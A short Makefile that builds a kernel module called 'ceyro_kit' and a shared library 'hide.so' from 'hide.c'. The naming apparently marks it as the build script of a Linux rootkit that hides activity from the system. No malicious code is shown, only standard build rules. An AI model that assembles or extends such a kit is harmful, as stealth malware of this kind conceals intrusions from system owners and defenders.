obj-m += ceyro_kit.o

all: hide.so
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

hide.so: hide.c
	gcc -Wall -fPIC -shared -o hide.so hide.c -ldl

clean:
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
	rm -f hide.so
